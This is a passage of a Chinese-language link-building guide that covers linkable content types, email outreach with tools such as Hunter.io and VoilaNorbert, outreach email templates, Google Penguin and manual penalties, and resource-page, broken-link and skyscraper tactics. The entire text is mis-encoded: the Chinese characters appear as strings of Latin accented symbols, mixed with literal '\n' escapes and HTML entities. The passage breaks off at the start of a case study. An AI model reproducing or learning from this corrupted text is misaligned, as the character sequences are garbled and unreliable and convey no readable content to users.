å¹´çš„ä»Šå¤©ï¼Œæ¯å€‹æœˆäººå€‘ä»ç„¶é€£çµæ­¤åœ–ã€‚\né€™å°±æ˜¯å‰µé€ è¦–è¦ºåœ–è¡¨çš„å¼·å¤§ä¹‹è™•ã€‚\näºŒã€åˆ—é»æ–‡ç«  å®ƒæ˜¯ä»€éº¼ ä¸€ç³»åˆ—çš„æ–¹æ³•ã€æŠ€è¡“ã€åŸå› ã€è¿·æ€æˆ–é—œæ–¼ä»»ä½•äº‹æƒ…ã€‚\nå®ƒç‚ºä»€éº¼æœ‰ç”¨ åˆ—é»æ–‡ç« å°‡å¤§é‡çš„åƒ¹å€¼ï¼ŒåŒ…è£æˆä¸€ä»½ä»½å¯ä¸€å£å’¬ä¸‹çš„å…§å®¹ã€‚\näº‹å¯¦ä¸Šï¼Œç•¶ BuzzSumo åˆ†æä¸€ç™¾è¬ç¯‡æ–‡ç« æ™‚ï¼Œä»–å€‘ç™¼ç¾é€™äº›åˆ—é»æ–‡ç« ï¼Œç›¸è¼ƒæ–¼å…¶ä»–å½¢å¼çš„å…§å®¹ï¼Œç”¢ç”Ÿæ›´å¤šåå‘é€£ç¯€ã€‚\nå®ƒå‹éæ¸¬é©—ã€å½±ç‰‡ï¼Œç”šè‡³æ˜¯è³‡è¨ŠåŒ–åœ–è¡¨ã€‚\nå¯¦éš›ä¾‹å­ ã€Š2022 æœ€æ–°çš„ 19 å€‹ SEO æŠ€å·§ã€‹é€™å€‹åˆ—è¡¨æ–‡ç« ï¼Œæ˜¯æˆ‘æœ€ç†±é–€çš„ä¸€å€‹å…§å®¹ã€‚\næ²’éŒ¯ï¼Œå®ƒç”¢ç”Ÿä¸€å¤§å †åˆ†äº«\u0026hellip;\nä»¥åŠç•™è¨€\nä½†æœ€é‡è¦çš„æ˜¯ï¼Œæ­¤è²¼æ–‡æ˜¯ä¸€å€‹é€£çµç£éµã€‚\nå®ƒæ“æœ‰è¶…é 4,000 æ¢é€£çµã€‚\nä¹Ÿå› ç‚ºæ­¤æ–‡ç« ï¼Œæ“æœ‰é€™éº¼å¤šé€£çµæŒ‡å‘å®ƒï¼Œå®ƒå–å¾—é—œéµå­—ã€ŒSEO Techniquesã€çš„å‰ 5 åã€‚\nä¸‰ã€åŸå‰µçš„ç ”ç©¶èˆ‡æ•¸æ“š å®ƒæ˜¯ä»€éº¼ å¾ç”¢æ¥­å ±å‘Šã€èª¿æŸ¥æˆ–åŸå‰µç ”ç©¶ä¸­ï¼Œæ­éœ²æœ€æ–°æ•¸æ“šçš„å…§å®¹ã€‚\nå®ƒç‚ºä»€éº¼æœ‰ç”¨ ç ”ç©¶èˆ‡æ•¸æ“šå…·æœ‰é«˜åº¦å¯é€£çµæ€§ã€‚\nç•¶æŸäººå¼•ç”¨ä½ çš„æ•¸æ“šï¼Œå®ƒæœƒèˆ‡ä½ é€£çµï¼Œé€™äº›é€£çµå¢åŠ å¾—éå¸¸å¿«ã€‚\nå¯¦éš›ä¾‹å­ å‰äº›æ—¥å­ï¼Œæˆ‘ç™¼å¸ƒä¸€ç¯‡å¤§å‹ Google æ’åå› ç´ èª¿æŸ¥ã€‚\nä¸ç”¨èªªï¼Œæ­¤è²¼æ–‡æ»¿è¼‰äº†å¤§é‡åŸå§‹æ•¸æ“šã€‚\né€™å°±æ˜¯ç‚ºä»€éº¼æ­¤è²¼æ–‡è‡³ä»Šï¼Œå¯ä»¥ç´¯è¨ˆ 18,900 å‰‡åå‘é€£ç¯€ï¼Œé€™å€‹é©šäººçš„æ•¸å­—ã€‚\nå¦‚æˆ‘ä¸Šè¿°æåŠï¼Œé€™äº›é€£çµå¤§å¤šæ•¸ä¾†è‡ªäººå€‘å¼•ç”¨æˆ‘å€‘çš„ç ”ç©¶ï¼š\nå››ã€æ·±åº¦å®Œæ•´çš„æŒ‡å— å®ƒæ˜¯ä»€éº¼ ä¸€å€‹é—œæ–¼æŸä¸»é¡Œç¶œåˆæ€§è³‡æºï¼Œå…¶ä¸­åŒ…å«æ‰€éœ€è¦çŸ¥é“çš„ä¸€åˆ‡äº‹ç‰©ã€‚\nå®ƒç‚ºä»€éº¼æœ‰ç”¨ çµ‚æ¥µæŒ‡å—å°‡é©šäººæ•¸é‡çš„è³‡è¨Šé›†ä¸­åœ¨ä¸€è™•ï¼Œä¸¦ä½¿ä½ çš„æŒ‡å—ï¼Œæˆç‚ºè©²è³‡æºçš„é¦–é¸ã€‚\nå¯¦éš›ä¾‹å­ æˆ‘æ›¾ç¶“å¾ email æ”¶åˆ°äººå€‘è©¢å•æˆ‘ï¼Œé—œæ–¼æ¯æ—¥é—œéµå­—ç ”ç©¶çš„åŸºæœ¬æ¦‚å¿µã€‚\nå¾ˆä¸å¹¸åœ°ï¼Œé—œæ–¼é€™å€‹éå¸¸é‡è¦çš„ä¸»é¡Œï¼Œé‚£æ™‚åœ¨æˆ‘çš„éƒ¨è½æ ¼ä¸­ï¼Œä¸¦æ²’æœ‰ä»»ä½•å…§å®¹ã€‚\nå› æ­¤ï¼Œæˆ‘å‰µé€ äº†ä¸€å€‹ï¼šã€ŠSEO é—œéµå­—ç ”ç©¶ï¼šçµ‚æ¥µæŒ‡å—ã€‹\nå› ç‚ºé€™å€‹å¤šç« ç¯€çš„æŒ‡å—ï¼Œæ¶µè“‹äº†å…¶ä»–ç¶²è·¯è³‡æºæ²’æœ‰çš„å…§å®¹ã€‚\nå®ƒå·²ç¶“è¢«é€£çµè¶…é 37,700 æ¬¡ã€‚\nç¾åœ¨ï¼Œä½ å·²ç¶“å‰µé€ å‡ºä¸€äº›å€¼å¾—é€£çµçš„å…§å®¹ï¼Œæ˜¯æ™‚å€™æ‰“é€ ä¸€äº›é€£çµã€‚\nå¦‚ä½•åšï¼Ÿ\né€ééå¸¸ç¶“å…¸çš„é›»å­éƒµä»¶æ¨å»£ã€‚\nç¬¬ 4 ç« ï¼šå¦‚ä½•é€éé›»å­éƒµä»¶æ¨å»£ï¼Œæ‰“é€ å¼·è€Œæœ‰åŠ›çš„é€£çµ å¦‚æœä½ æƒ³è¦åœ¨ 2022 å¹´æ‰“é€ ç™½å¸½é€£çµï¼Œä½ éœ€è¦ä½¿ç”¨é›»å­éƒµä»¶æ¨å»£ã€‚\nå•é¡Œæ˜¯ï¼š\nä½ çš„ä¿¡ä»¶å¦‚ä½•èˆ‡éƒ¨è½å®¢èˆ‡è¨˜è€…å€‘è¯ç¹«ä¸Šï¼Œè€Œéè¢«ä¸Ÿé€²åƒåœ¾ä¿¡ä»¶çš„è³‡æ–™å¤¾ä¸­ã€‚\né–±è®€æœ¬ç« ç¯€ï¼Œæ‰¾å‡ºæ–¹æ³•ã€‚\næ­¥é©Ÿä¸€ï¼šæ‰¾åˆ°ã€Œå¯èƒ½é€£çµè€…ã€ å¦‚åŒåç¨±æ‰€è¿°ï¼Œå¯èƒ½é€£çµè€…æ˜¯ä¸€ç¾¤å¯èƒ½æœƒé€£çµä½ ç¶²ç«™çš„äººã€‚\næˆ‘å°‡æœƒåœ¨ç¬¬ 6 ç« ï¼Œå‘ä½ å±•é …æ‰¾å‡ºã€Œå¯èƒ½é€£çµè€…ã€çš„ä¸€å¤§å †æŠ€å·§ã€‚\nä½†ç¾åœ¨ï¼Œè®“æˆ‘å€‘å…ˆä½¿ç”¨ç°¡å–®çš„ç­–ç•¥ï¼Œç”¨ä¾†è¾¨èªå‡ºä»–å€‘ï¼šåå‘å·¥ç¨‹ã€‚\né¦–å…ˆï¼Œåœ¨ Google æœå°‹ä½ çš„é—œéµå­—ã€‚\nåœ¨ç¬¬ä¸€é æœå°‹çµæœé ï¼ŒæŒ‘é¸ä¸€å€‹ç¶²ç«™é€£çµï¼Œä¸¦æ”¾é€²é€£çµåˆ†æå·¥å…·ï¼ˆæˆ‘ä½¿ç”¨Semrush ç‚ºä¾‹ï¼‰\næ¥è‘—ï¼Œé»æ“Šå´æ””çš„ã€Œåå‘é€£ç¯€åˆ†æã€ï¼Œå†é»ã€Œåå‘é€£ç¯€ã€ã€‚\né€™å€‹ç¶²ç«™æœƒåœ¨ä¸‹æ–¹ï¼Œæ¢åˆ—å‡ºå…¨éƒ¨çš„å¯èƒ½é€£çµè€…ã€‚\n(ä½ å¦‚ä½•çŸ¥é“å“ªå€‹ç¶²ç«™å€¼å¾—é–å®šã€å“ªå€‹ç¶²ç«™è¦å¿½ç•¥ï¼Ÿå»æŸ¥çœ‹ç¬¬äºŒç« çš„å…§å®¹)\næ­¥é©ŸäºŒï¼šæ‰¾åˆ°ä»–å€‘çš„é›»å­éƒµä»¶åœ°å€ ç¾åœ¨ï¼Œä½ å·²ç¶“æ‰¾å‡ºå¯èƒ½é€£çµè€…ï¼Œæ˜¯æ™‚å€™æŒ–å‡ºä»–å€‘çš„é›»å­éƒµä»¶åœ°å€ã€‚\n:::danger\né€²éšæŠ€å·§ï¼šåƒ…åœ¨ä¸å¾—å·²çš„æƒ…æ³ä¸‹ï¼Œæ‰å»ä½¿ç”¨ç¶²ç«™çš„è¯ç¹«è¡¨å–®ï¼Œå› ç‚ºé‚£ä¸€å€‹é»‘æ´\n:::\nä»¥ä¸‹æ˜¯åŸ·è¡Œæ­¥é©Ÿï¼š\nä½¿ç”¨ Hunter.io\nHunter.io éå¸¸é©åˆç”¨æ–¼è¯ç¹«å°å‹ç¶²ç«™èˆ‡å€‹äººéƒ¨è½æ ¼ã€‚\nå–®ç´”åœ¨å·¥å…·ä¸­è¼¸å…¥ç¶²ç«™\næ¥è‘—ï¼Œä»–å°‡æœƒå‘ä½ å±•ç¾ï¼Œèˆ‡è©²ç¶²åŸŸé—œè¯çš„é›»å­éƒµä»¶åœ°å€ã€‚\nä½†å¦‚æœä½ æƒ³è¦æ¥è§¸å¤§å‹ç¶²ç«™å‘¢ï¼Ÿæ¢³ç†é€™ä»½æ¸…å–®å°‡æœƒéå¸¸ç—›è‹¦ã€‚\né€™å°±æ˜¯ç‚ºä»€éº¼ï¼Œé‡å°é€™äº›æƒ…å¢ƒï¼Œæˆ‘æ¨è–¦ VoilaNorbert\nVoilaNorbert è—‰ç”± VoilaNorvert.com ï¼Œä½ åªè¦è¼¸å…¥æŸäººçš„åå­—èˆ‡å·¥ä½œçš„ç¶²åŸŸï¼Œå°±èƒ½æˆåŠŸé‹ä½œï¼Œè€Œä¸éœ€è¼¸å…¥ç¶²å€ã€‚\né€™æ¨£ï¼Œä½ å°±èƒ½æ¥è§¸åˆ°é‚£äº›å¯èƒ½é€£çµè€…ï¼Œä¸¦è®“ä»–å€‘æŠŠä½ ç¶²ç«™é€£çµï¼Œæ”¾åˆ°ä»–å€‘é é¢ä¸Šçš„ã€‚\nåŒæ™‚ï¼Œå®ƒä¹Ÿæœƒå‘ä½ å±•ç¾ç‰¹å®šå°è±¡çš„é›»å­éƒµä»¶åœ°å€ã€‚\næ­¥é©Ÿä¸‰ï¼šå¯„çµ¦ä»–å€‘ä¸€å€‹å®¢è£½åŒ–çš„å…§å®¹ å¦‚æœä½ æƒ³ä½¿é›»å­éƒµä»¶æ¨å»£è¦æ¨¡åŒ–ï¼Œä½ å°‡æœƒéœ€è¦ä½¿ç”¨æ¨¡æ¿ã€‚\nä½¿ç”¨æ¨¡æ¿çš„æŠ€å·§åœ¨æ–¼ï¼Œä¸è¦è®“ä½ çš„æ¨¡æ¿çœ‹èµ·ä¾†åƒæ¨¡æ¿ï¼ˆä¸‹å€‹æ­¥é©Ÿæœƒè§£é‡‹æ›´å¤šç´°ç¯€ï¼‰\nä½†ç¾åœ¨ï¼Œä»¥ä¸‹æ˜¯æˆ‘åŸ·è¡Œæœ€å¥½çš„é›»å­éƒµä»¶æ¨¡æ¿ä¹‹ä¸€\n:::info\nå—¨ï¼ˆåç¨±ï¼‰ã€‚\næˆ‘ä»Šå¤©æ­£å°‹æ‰¾é—œæ–¼ï¼ˆæŸä¸»é¡Œï¼‰çš„å…§å®¹ï¼Œå¶ç„¶ç™¼ç¾ä½ çš„æ–‡ç« ï¼šï¼ˆæ–‡ç« æ¨™é¡Œï¼‰\næˆ‘ç™¼ç¾å®ƒçš„å…§å®¹éå¸¸å¥½ï¼å…¶ä¸­ï¼Œæˆ‘ç‰¹åˆ¥å–œæ­¡ï¼ˆä»–å€‘æ–‡ç« çš„ç‰¹å®šå…§å®¹ï¼‰ã€‚\næ­¤å¤–ï¼Œæˆ‘æœ€è¿‘ä¹Ÿåœ¨ï¼ˆä½ çš„ä¸»é¡Œï¼‰ç™¼å¸ƒäº†ä¸€å€‹æ–°æŒ‡å—ï¼šï¼ˆç¶²å€ï¼‰ã€‚\nä½œç‚ºä¸€ä½åœ¨æ’°å¯«é—œæ–¼ï¼ˆæŸä¸»é¡Œï¼‰çš„äººï¼Œæˆ‘èªç‚ºä½ ä¹Ÿæœƒå–œæ­¡å®ƒã€‚\næˆ‘çš„æŒ‡å—åŒæ¨£å¯èƒ½ï¼Œæˆç‚ºä½ ç¶²é ä¸Šçš„ä¸€å€‹ä¸éŒ¯çš„å»¶ä¼¸é–±è®€ã€‚\nä¸è«–å¦‚ä½•ï¼Œå¸Œæœ›ä½ ç¹¼çºŒåœ¨ï¼ˆå°æ–¹ç¶²ç«™ï¼‰æä¾›ç²¾å½©çš„ä½œå“ã€‚\næœ‰ç©ºå†èŠã€‚\n:::\næ³¨æ„åˆ°é€™å€‹ç¯„æœ¬ï¼Œå…§å«äº†è¨±å¤šå®¢è£½åŒ–çš„è³‡è¨Šï¼Œå»ä¸éœ€èŠ±è²»è¨±å¤šåŠ›æ°£ã€‚\nç¬¬ 5 ç« ï¼šé»‘å¸½é€£çµå„ªåŒ–çš„çœŸå¯¦æƒ…æ³ å¦‚æœæ²’æœ‰é—œæ–¼é»‘å¸½ SEO çš„ç« ç¯€ï¼Œä»»ä½•é€£çµå„ªåŒ–çš„æŒ‡å—éƒ½ä¸å®Œæ•´ã€‚\né»‘å¸½é€£çµå„ªåŒ–éå¸¸å®¹æ˜“è¢«ç™¼ç¾ï¼š\nå¦‚æœå–å¾—åå‘é€£ç¯€çš„æ–¹æ³•ï¼Œèˆ‡ Google çš„ç¶²ç«™æŒ‡å—é•èƒŒï¼Œå®ƒå¤§æ¦‚å°±æ˜¯é»‘å¸½ã€‚\né€™å°±è¡¨ç¤ºï¼Œä½ æ‡‰è©²é¿å…ä½¿ç”¨é»‘å¸½å„ªåŒ–é€£çµå—ï¼Ÿ\né€™å€‹é¸æ“‡å–æ±ºæ–¼ä½ ã€‚\næˆ‘å€‹äººä¸å»ºè­°ä½¿ç”¨é»‘å¸½å„ªåŒ–é€£çµï¼ˆé¢¨éšªèˆ‡å›å ±ä¸æˆæ¯”ä¾‹ï¼‰ã€‚\nè©±é›–å¦‚æ­¤ï¼Œä¸è«–ä½ æ˜¯ä¸€ä½ç™½å¸½æˆ–é»‘å¸½ SEOï¼Œä½ éƒ½éœ€è¦çŸ¥é“ Google çµ¦äºˆé»‘å¸½çš„æ‡²ç½°ã€‚\nå› æ­¤ï¼Œæˆ‘å€‘ç°¡å–®çµ±æ•´å®ƒå€‘ï¼š\nGoogle ä¼éµ å®ƒæ˜¯ä»€éº¼ï¼š ä¸€å€‹æ‡²ç½°æ¼”ç®—æ³•ï¼Œç”¨ä¾†é‡å°ä½¿ç”¨åƒåœ¾é€£çµå»ºç«‹æ¬Šé‡çš„ç‰¹å®šç¶²ç«™ã€‚\nä¾‹å¦‚ï¼Œå¯ç–‘çš„å®¢åº§æ–‡ç« æˆ–æ–‡ç« ç•™è¨€è™•çš„åƒåœ¾è¨Šæ¯ã€‚\nå¦‚ä½•é¿å…å®ƒï¼š åªæœ‰å»ºç«‹ç™½å¸½é€£çµèƒ½é¿å…ã€‚\næœ‰æ•¸æ“šé¡¯ç¤ºï¼Œä½ å¯ä»¥è—‰ç”±æœ€å°åŒ–å®Œå…¨åŒ¹å…‹éŒ¨é»æ–‡å­—ï¼Œç”¨ä»¥èº²é¿ä¼éµæ¼”ç®—æ³•ã€‚\n(æˆ‘èªªééŒ¨é»æ–‡å­—æ˜¯å¦ä¸€å€‹å…§å®¹äº†ï¼Œä½†å®ƒçš„é—œéµåœ¨æ–¼ä¿¡ä»»)\næ›å¥è©±èªªï¼Œèº²é¿ä¼éµæ¼”ç®—æ³•æœ€ç°¡å–®çš„æ–¹å¼ï¼Œå°±æ˜¯é¿å…ä½¿ç”¨å¯ç–‘çš„é€£çµï¼ˆæˆ–éŒ¨é»æ–‡å­—ï¼‰\næ‰‹å‹•æ‡²ç½°èˆ‡éè‡ªç„¶é€£çµ å®ƒæ˜¯ä»€éº¼ï¼š ä¸€ä½ä¾†è‡ª Google å…¬å¸å“¡å·¥çš„æ‰‹å‹•æ‡²ç½°ã€‚\nå®ƒèˆ‡ä¼éµæ¼”ç®—æ³•ä¸åŒï¼ŒGoogle å°‡æœƒè—‰ç”± Google Search Console å¯„çµ¦å¦³ä¸€å°è¨Šæ¯ã€‚\nå¦‚ä½•é¿å…å®ƒï¼š é™¤äº† Google ä»¥å¤–ï¼Œæ²’äººçŸ¥é“è‡ªå·±çš„ç¶²ç«™ç‚ºä»€éº¼è¢«æ‰‹å‹•æ‡²ç½°ã€‚\næˆ‘çš„çœ‹æ³•æ˜¯æœ‰æŸå€‹æ¼”ç®—æ³•ï¼ŒæŒ‡å‡ºä¸€å€‹ç¶²ç«™æ­£åœ¨ç©å¼„ç³»çµ±ã€‚\nå› æ­¤ï¼Œä»–å€‘å°‡ç¶²ç«™éæ¿¾å‡ºä¾†ä¸¦åšæ‰‹å‹•æª¢é©—ã€‚\nå¯çŸ¥ï¼Œæœ€å¥½çš„é¿å…æ–¹å¼æ˜¯æ“æœ‰ä¸€å€‹éå¸¸ä¹¾æ·¨çš„åå‘é€£çµæª”æ¡ˆã€‚\næ­¤å¤–ï¼Œä¸åƒä¼éµæ¼”ç®—æ³•ï¼Œä½ å¯ä»¥é€éã€Œç¦æ­¢é€£çµæŒ‡å‘ç¶²ç«™ã€èˆ‡ã€Œç”³è«‹é‡æ–°å¯©æŸ¥ã€å¾æ‰‹å‹•æ‡²ç½°ä¸­æ¢å¾©ã€‚\nç¬¬ 6 ç« ï¼šæˆ‘æœ€å–œæ­¡çš„ 3 å€‹é€£çµå„ªåŒ–ç­–ç•¥ï¼ˆæŒ‰æ­¥é©Ÿæ•™å­¸ï¼‰ æœ¬ç« ç¯€ä¸éœ€è¦å‰è¨€ã€‚\nä»¥ä¸‹æ˜¯æˆ‘ç”¨å¯¦æˆ°ç¶“é©—é©—è­‰ï¼Œå–å¾—ä¸–ç•Œç´šåå‘é€£çµçš„ 3 å€‹ç­–ç•¥ã€‚\nè³‡æºé é¢é€£çµå„ªåŒ– é¦–å…ˆï¼Œä»€éº¼æ˜¯è³‡æºé é¢ï¼Ÿ\nè³‡æºé é¢æ˜¯æŒ‡åœ¨ç‰¹å®šä¸»é¡Œä¸­ï¼Œæ•´åˆæ“æœ‰è‰¯å¥½å…§å®¹çš„é€£çµã€‚\nä»¥ä¸‹æ˜¯ç¯„ä¾‹ï¼š\nå› ç‚ºé€™äº›é é¢å­˜åœ¨çš„åŸå› ï¼Œæ˜¯å°‡ä½¿ç”¨è€…å°å‘é©åˆçš„åœ°æ–¹ã€‚\nå› æ­¤ï¼Œé€™æ˜¯å€‹çµ•ä½³çš„é€£çµå»ºç«‹ç­–ç•¥ã€‚\nä»¥ä¸‹æ˜¯å…·é«”æ­¥é©Ÿï¼š\næ­¥é©Ÿ 1ï¼šæ‰¾åˆ°è³‡æºé é¢ åœ¨ Google ä½¿ç”¨é€™äº›æœå°‹å­—è©ã€‚\nä»–å€‘æ˜¯å°ˆé–€è¨­è¨ˆç”¨ä¾†æŒ–æ˜è³‡æºé é¢ï¼š\né—œéµå­— + inurl:links é—œéµå­— + ã€Œæœ‰å¹«åŠ©çš„è³‡æºã€ é—œéµå­— + ã€Œæœ‰ç”¨çš„è³‡æºã€ é—œéµå­— + ã€Œæœ‰ç”¨çš„é€£çµã€ æ­¥é©Ÿ 2ï¼šæª¢è¦–è©²é é¢ ä»¥ä¸‹æ˜¯ä½ éœ€å¿«é€Ÿå›ç­”çš„å•é¡Œï¼š\nã€Œä¾†è‡ªé€™å€‹ç¶²é çš„é€£çµï¼Œå€¼å¾—åŠªåŠ›çˆ­å–å—ï¼Ÿã€\nï¼ˆæé†’ï¼šä½¿ç”¨ç¬¬ 2 ç« çš„æŠ€å·§ç°¡åŒ–æ­¤æ­¥é©Ÿï¼‰\nèˆ‰ä¾‹ä¾†èªªï¼Œé€™å€‹è³‡æºé æ“æœ‰ä¸€å€‹é«”é¢çš„ URL åˆ†æ•¸ï¼š12ï¼Œé‚„ä¸éŒ¯ã€‚\nå®ƒåŒæ¨£æ“æœ‰ä¸€å€‹å…·æ¬Šå¨æ€§çš„ç¶²ç«™ã€‚\nè€Œæˆ‘çš„é€£çµï¼Œæœ€å¾Œå°‡æœƒåœ¨æ­¤ç¶²é çš„ä¸»é«”å€å¡Šï¼Œå¦‚åŒå‹åˆ©è€…èˆ¬ã€‚\næ­¥é©Ÿ 3ï¼šæ‰¾åˆ°æœ€ç¬¦åˆçš„å…§å®¹ æ³¨æ„ï¼š\nä½ å¯èƒ½æ“æœ‰æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„å…§å®¹ï¼Œä½†å¦‚æœå®ƒèˆ‡è³‡æºé çš„ä¸»é¡Œä¸ç›¸æ­å‘¢ï¼Ÿ\nä½ å°‡ä¸æœƒå–å¾—è©²é€£çµã€‚\nå› æ­¤æ­¤æ­¥é©Ÿçš„ç›®çš„ï¼Œæ˜¯è¦æ‰¾å‡ºèˆ‡ä½ å…§å®¹ç›¸ç¬¦çš„è³‡æºé é¢ã€‚\nä¾ä½†ä½ è­˜åˆ¥å‡ºå…§å®¹ï¼Œè·³è‡³ç¬¬å››æ­¥é©Ÿ\næ­¥é©Ÿ 4ï¼šå¯„é€æ­¤å°ç¶“æ¸¬è©¦çš„æ¨¡æ¿ ä»¥ä¸‹æ˜¯æˆ‘å»ºè­°çš„æ¨¡æ¿ï¼š\n:::info\næ¨™é¡Œï¼šé—œæ–¼ï¼ˆå°æ–¹ç¶²ç«™ï¼‰çš„å•é¡Œ\n\u0026ndash;\nå—¨ï¼ˆåå­—ï¼‰ã€‚\nä»Šæ—©ï¼Œæˆ‘åœ¨ Google æœå°‹é—œæ–¼ï¼ˆä¸»é¡Œï¼‰çš„å…§å®¹æ™‚ï¼Œçœ‹åˆ°ä½ çš„å„ªè³ªè³‡æºé ï¼šï¼ˆç¶²å€ï¼‰\næˆ‘åªæ˜¯æƒ³è¦è·Ÿä½ èªªï¼šä½ çš„ç¶²é å¹«äº†æˆ‘å¾ˆå¤§çš„å¿™ã€‚\nå¦‚æœæ²’æœ‰æ­¤ç¶²é ï¼Œæˆ‘å°‡æ°¸é ä¸æœƒæ‰¾åˆ°ï¼ˆè©²ç¶²ç«™é€£çµçš„è³‡æºï¼‰ã€‚\næœ‰è¶£çš„äº‹ï¼šæˆ‘ä¸Šå€‹æœˆå‰›ç™¼å¸ƒäº†ä¸€å€‹é—œæ–¼ï¼ˆä¸»é¡Œï¼‰çš„æŒ‡å—ï¼Œå®ƒæ˜¯ï¼ˆç°¡çŸ­æ‘˜è¦ï¼‰ã€‚\nå¦‚æœä½ æƒ³æŸ¥çœ‹è©²å…§å®¹ï¼Œä»¥ä¸‹æ˜¯é€£çµï¼šï¼ˆï¼‰\næ­¤å¤–ï¼Œæˆ‘çš„æŒ‡å—ä¹Ÿå¯èƒ½æ˜¯é©åˆæ·»åŠ åˆ°ä½ çš„ç¶²é ã€‚\nä¸è«–å¦‚ä½•ï¼Œè¬è¬ä½ å°‡ç›¸é—œè³‡æºæ¢åˆ—æ•´ç†ã€‚\nç¥ä½ æœ‰å€‹ç¾å¥½çš„ä¸€å¤©ï¼\næœŸå¾…å›å¾©ã€‚\nï¼ˆä½ çš„åå­—ï¼‰\n:::\n:::danger\nå¦‚åŒæ‰€æœ‰å¤–éƒ¨æ¥è§¸çš„æ¨¡æ¿ï¼Œç¢ºä¿æ­¤æ¨¡æ¿ç›¡å¯èƒ½å®¢è£½åŒ–ã€‚\nä½ å¯ä»¥ä½¿ç”¨ä¸€å€‹ã€Œçœ‹èµ·ä¾†ä¸€é»éƒ½ä¸åƒæ¨¡æ¿ã€çš„æ¨¡æ¿ã€‚\n:::\nç ´æé€£çµå„ªåŒ– ã€Œç ´æé€£çµå„ªåŒ–ã€ä¸€ç›´æ˜¯æˆ‘æœ€å–œæ­¡çš„å„ªåŒ–ç­–ç•¥ã€‚\nç‚ºä»€éº¼ï¼Ÿ\né€éç ´æé€£çµå„ªåŒ–ï¼Œä½ å¯ä»¥æ›¿æŸäººçš„ç¶²ç«™æé«˜åƒ¹å€¼ï¼Œè€Œéç›´æ¥è«‹æ±‚é€£çµã€‚\nä»¥ä¸‹æ˜¯åŸ·è¡Œæ­¥é©Ÿï¼š\n1. å®‰è£ Check My Links æˆ– LinkMiner ä¸Šè¿°å…©è€…å·¥å…·ï¼Œéƒ½èƒ½å¿«é€Ÿæ‰¾åˆ°ä»»ä½•ç¶²é çš„ç ´æé€£çµï¼ˆé€éä½ çš„ Chrome ç€è¦½å™¨ï¼‰ã€‚\næˆ‘å°‡æœƒåœ¨æ¥ä¸‹å¹¾åˆ†é˜ï¼Œç·šä½ å±•ç¤ºå¦‚ä½•ä½¿ç”¨å®ƒå€‘ã€‚\n2. æ‰¾åˆ°æ“æœ‰è¨±å¤šå¤–éƒ¨é€£çµçš„é é¢ ä¸€å€‹ç¶²é è¶Šå¤šé€£çµï¼Œä»–å€‘ä¹‹ä¸­è¶Šæœ‰å¯èƒ½æœƒç”¢ç”Ÿç ´æé€£çµã€‚\nè³‡æºé éå¸¸é©ç”¨æ–¼æ­¤æƒ…æ³ã€‚\nå› æ­¤ï¼Œè«‹ç›¡æƒ…ä½¿ç”¨ä¸Šæ–‡çš„æœå°‹å­—ä¸²ï¼Œæ‰¾å‡ºç›¸æ‡‰çš„è³‡æºé ã€‚\n4. æŸ¥çœ‹ç ´æé€£çµ ä»¥ä¸‹ï¼Œæ˜¯ä½ åŸ·è¡Œåœ¨æ­¥é©Ÿä¸€å®‰è£çš„å¤–æ›çš„åœ°æ–¹ã€‚\nå®ƒå°‡æœƒé€æ¼è©²é é¢çš„ç ´æé€£çµï¼š\n4. å¯„é€éƒµä»¶çµ¦è©²ç¶²ç«™ç®¡ç†å“¡ï¼Œå‘ŠçŸ¥é—œæ–¼ç ´æé€£çµçš„äº‹æƒ… æœ€å¾Œï¼Œè®“ç¶“ç‡Ÿè©²ç¶²é çš„äººï¼ŒçŸ¥é“è©²é çš„ç ´æé€£çµï¼Œä¸¦ä½œç‚ºäº¤æ›ï¼Œè®“å°æ–¹é€£çµä½ çš„ç¶²ç«™ã€‚\nä»¥ä¸‹æ˜¯æˆ‘å»ºè­°çš„æ¨¡æ¿ï¼š\n:::info\næ¨™é¡Œï¼šï¼ˆå°æ–¹ç¶²ç«™åç¨±ï¼‰çš„å•é¡Œ\n\u0026ndash;\nä½ å¥½(å§“å)ï¼Œè«‹å•ä½ é‚„æœ‰å†æ›´æ–°ä½ çš„ç¶²ç«™å—ï¼Ÿ\næˆ‘åœ¨æœå°‹ï¼ˆä¸»é¡Œï¼‰çš„å…§å®¹æ™‚ï¼Œç™¼ç¾ä½ çµ•ä½³çš„ç¶²é ï¼šï¼ˆç¶²é æ¨™é¡Œæˆ–ç¶²å€ï¼‰\nç„¶è€Œï¼Œæˆ‘ç™¼ç¾æœ‰å¹¾å‰‡é€£çµæ˜¯å¦å·²å¤±æ•ˆï¼š\nï¼ˆç ´æé€£çµçš„ç¶²å€ï¼‰\næ­¤å¤–ï¼Œæˆ‘æœ€è¿‘ç™¼å¸ƒï¼ˆç°¡çŸ­çš„å…§å®¹æè¿°ï¼‰ã€‚\nå®ƒå¯èƒ½é©åˆå–ä»£ï¼ˆæŒ‡å‡ºç‰¹å®šçš„ç ´æé€£çµï¼‰ã€‚\nä¸è«–å¦‚ä½•ï¼Œå¸Œæœ›é€™æœ‰å¹«åŠ©åˆ°ä½ ã€‚\nè¬è¬\nï¼ˆä½ çš„åå­—ï¼‰\n:::\næ‘©å¤©å¤§æ¨“æŠ€è¡“ é€™éƒ¨å½±ç‰‡å°‡æ‰‹æŠŠæ‰‹ï¼Œå¸¶ä½ èµ°éå…¨éƒ¨æµç¨‹ã€‚\n{%youtube 263xIymvLl4 %}\nä¸€æ—¦ä½ è§€çœ‹å®Œæ­¤å½±ç‰‡ï¼Œå°±æ˜¯æ™‚å€™é€²å…¥ä¸‹ä¸€ç« ç¯€ï¼š\néå¸¸æ£’çš„é€£çµå„ªåŒ–æ¡ˆä¾‹ç ”ç©¶ï¼\nç¬¬ 7 ç« ï¼šé©šäººçš„æ¡ˆä¾‹ç ”ç©¶ ç¾åœ¨ï¼Œæ˜¯æ™‚å€™å‘ä½ å±•ç¾é€£çµå„ªåŒ–å¯¦éš›çš„ä¾‹å­ã€‚\næœ€æ£’çš„éƒ¨åˆ†æ˜¯ï¼Œæˆ‘ä¹‹å‰å¾ä¾†æ²’æœ‰åˆ†äº«éé€™äº›å…§å®¹ã€‚\næ¡ˆä¾‹ä¸€ Julie å¦‚ä½•ä½¿ç”¨æ‘©å¤©å¤§æ¨“æŠ€å·§ï¼Œå¢åŠ  194.1% çš„è‡ªç„¶æœå°‹æµé‡ Julie Adams çš„éƒ¨è½æ 